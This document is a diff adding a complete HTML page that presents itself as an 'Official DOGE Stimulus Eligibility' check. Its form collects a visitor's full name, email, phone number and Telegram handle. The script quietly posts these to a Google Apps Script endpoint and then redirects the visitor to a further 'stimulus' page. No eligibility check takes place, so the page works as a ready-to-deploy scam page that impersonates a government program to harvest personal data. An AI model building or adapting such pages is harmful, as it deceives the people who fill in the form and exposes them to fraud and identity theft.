@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="mk">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DOGE Stimulus Eligibility Check</title>
+  <style>
+
+    /* Subtle star field */
+    .stars{background-image:radial-gradient(1px 1px at 20px 20px,rgba(255,255,255,.9) 1px,transparent 1px);background-size:40px 40px}
+    /* Simple reveal */
+    .reveal{opacity:0;transform:translateY(12px);transition:opacity .6s ease,transform .6s ease}
+    .reveal.show{opacity:1;transform:none}
+
+    :root{
+      --bg:#0b1220;--card:#101c30;--text:#e9eef7;--muted:#9bb0d1;--accent:#4fa3ff;--ok:#23d18b;--warn:#ffb454;--err:#ff5c5c;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;display:grid;place-items:center;background:radial-gradient(1200px 600px at 10% 0%,#12213b 0%,#0b1220 60% 100%);
+      color:var(--text);font:16px/1.4 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;
+    }
+    .wrap{width:100%;max-width:780px;padding:24px}
+    .card{
+      background:linear-gradient(180deg,rgba(255,255,255,.06),transparent 20%) no-repeat,
+                 linear-gradient(0deg,rgba(255,255,255,.06),transparent 20%) no-repeat,
+                 var(--card);
+      border:1px solid rgba(255,255,255,.12);border-radius:20px;padding:14px 24px;box-shadow:0 10px 40px rgba(0,0,0,.35);
+      backdrop-filter:saturate(140%) blur(6px);
+    }
+    h1{margin:0 0 10px;font-size:28px;letter-spacing:.2px}
+    p.lead{margin:0 0 22px;color:var(--muted)}
+
+    form{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    label{font-size:12px;color:var(--muted);display:block;margin-bottom:6px}
+    .field{display:flex;flex-direction:column}
+    input{
+      height:46px;border-radius:12px;border:1px solid rgba(255,255,255,.14);
+      padding:0 14px;background:#0f192d;color:var(--text);outline:none;
+    }
+    input::placeholder{color:#7f93b6}
+    .full{grid-column:1 / -1}
+    .actions{display:flex;gap:12px;align-items:center;margin-top:6px}
+    button{
+      height:48px;padding:0 18px;border-radius:14px;border:1px solid rgba(255,255,255,.22);
+      background:linear-gradient(180deg,#2a64ff,#1a3bbf);color:white;font-weight:700;letter-spacing:.2px;
+      cursor:pointer;box-shadow:0 6px 20px rgba(42,100,255,.35);
+    }
+    button[disabled]{opacity:.6;cursor:not-allowed}
+    .note{font-size:13px;color:var(--muted)}
+    .status{margin-top:12px;font-size:14px}
+    .ok{color:var(--ok)}
+    .err{color:var(--err)}
+    .badge{display:inline-flex;align-items:center;gap:8px;background:#0d1a31;border:1px solid rgba(255,255,255,.12);
+      padding:6px 10px;border-radius:999px;font-size:12px;color:#b6c7e6;margin-bottom:12px}
+    .badge svg{width:16px;height:16px}
+    @media (max-width:720px){form{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+  <div class="card">
+    <div class="badge" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a1 1 0 0 1 .894.553l2.382 4.763 5.259.764a1 1 0 0 1 .554 1.705l-3.8 3.703.897 5.23a1 1 0 0 1-1.451 1.054L12 18.77l-4.685 2.463a1 1 0 0 1-1.451-1.054l.897-5.23-3.8-3.703a1 1 0 0 1 .554-1.705l5.26-.764L11.106 2.553A1 1 0 0 1 12 2z"/></svg>
+      Official DOGE Stimulus Eligibility
+    </div>
+    <h1>Check your DOGE eligibility status</h1>
+    <p class="lead">Enter your details to check if you qualify for the DOGE stimulus check.</p>
+
+    <form id="leadForm" novalidate>
+      <div class="field full">
+        <label for="fullName">Full Name</label>
+        <input id="fullName" name="fullName" type="text" placeholder="Name & Surname" required />
+        <small class="error-message" style="color: var(--err); display: none;">Please enter your full name</small>
+      </div>
+
+      <div class="field">
+        <label for="email">Email</label>
+        <input id="email" name="email" type="email" placeholder="you@example.com" required />
+        <small class="error-message" style="color: var(--err); display: none;">Please enter a valid email</small>
+      </div>
+
+      <div class="field">
+        <label for="phone">Phone</label>
+        <input id="phone" name="phone" type="tel" placeholder="+1 xxx xxx xxxx" required />
+        <small class="error-message" style="color: var(--err); display: none;">Please enter a valid phone number</small>
+      </div>
+
+      <div class="field full">
+        <label for="telegram">Telegram @ <span style="color: var(--muted)">(optional)</span></label>
+        <input id="telegram" name="telegram" type="text" placeholder="@username" />
+      </div>
+
+      <div class="actions full">
+        <button id="submitBtn" type="submit">Check Eligibility</button>
+        <span class="note">By clicking, you agree that your data may be used for contact.</span>
+        <span id="redirecting" style="display:none; margin-left:10px; color: #28a745; font-weight:700;">✅ Redirecting<span id="dots">...</span></span>
+      </div>
+      <div id="status" class="status full" role="status" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+
+<script>
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbz-cgbJ3pJ2wma0TcwmUgPONbAvxpcs4cPuPCVN_TLJGsQAqYeuhHv1G7cGzaw3uHro/exec";
+
+const phoneInput = document.getElementById('phone');
+
+// Auto-format phone number +1 xxx xxx xxxx, numeric only
+phoneInput.addEventListener('input', function(e) {
+  let digits = this.value.replace(/\D/g, '');
+  if (digits.startsWith('1')) digits = digits.slice(1);
+  if (digits.length > 10) digits = digits.slice(0, 10);
+
+  let formatted = '+1';
+  if(digits.length > 0) formatted += ' ' + digits.substring(0,3);
+  if(digits.length >= 4) formatted += ' ' + digits.substring(3,6);
+  if(digits.length >= 7) formatted += ' ' + digits.substring(6,10);
+
+  this.value = formatted;
+  this.setSelectionRange(this.value.length, this.value.length);
+});
+
+// Redirecting animation
+function startRedirectAnimation() {
+  const redirectText = document.getElementById('redirecting');
+  const dots = document.getElementById('dots');
+  redirectText.style.display = 'inline';
+  let count = 0;
+  const interval = setInterval(() => {
+    count = (count + 1) % 4;
+    dots.textContent = '.'.repeat(count);
+  }, 500);
+  return interval;
+}
+
+document.getElementById('leadForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
+  let valid = true;
+
+  // Full Name
+  const fullNameInput = document.getElementById('fullName');
+  const fullNameError = fullNameInput.nextElementSibling;
+  if (!fullNameInput.value.trim()) {
+    fullNameError.textContent = "Please enter your full name";
+    fullNameError.style.display = 'block';
+    valid = false;
+  } else fullNameError.style.display = 'none';
+
+  // Email
+  const emailInput = document.getElementById('email');
+  const emailError = emailInput.nextElementSibling;
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailPattern.test(emailInput.value.trim())) {
+    emailError.textContent = "Please enter a valid email address";
+    emailError.style.display = 'block';
+    valid = false;
+  } else emailError.style.display = 'none';
+
+  // Phone
+  const phoneError = phoneInput.nextElementSibling;
+  const phonePattern = /^\+1 \d{3} \d{3} \d{4}$/;
+  if (!phonePattern.test(phoneInput.value.trim())) {
+    phoneError.textContent = "Please enter a valid phone number in the format +1 xxx xxx xxxx";
+    phoneError.style.display = 'block';
+    valid = false;
+  } else phoneError.style.display = 'none';
+
+  // Telegram optional
+  const telegram = document.getElementById('telegram').value.trim();
+
+  if (!valid) return;
+
+  // Start animation
+  const interval = startRedirectAnimation();
+
+  try {
+    await fetch(ENDPOINT, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        fullName: fullNameInput.value.trim(),
+        email: emailInput.value.trim(),
+        phone: phoneInput.value.trim(),
+        telegram
+      })
+    });
+
+    clearInterval(interval);
+    window.location.href = "stimulus.html";
+
+  } catch (error) {
+    clearInterval(interval);
+    console.error(error);
+    const statusDiv = document.getElementById('status');
+    statusDiv.textContent = "A problem occurred. Please check the Web App URL and try again.";
+    statusDiv.classList.add('err');
+  }
+});
+</script>
+
+
+
+
+
+</body>
+</html>
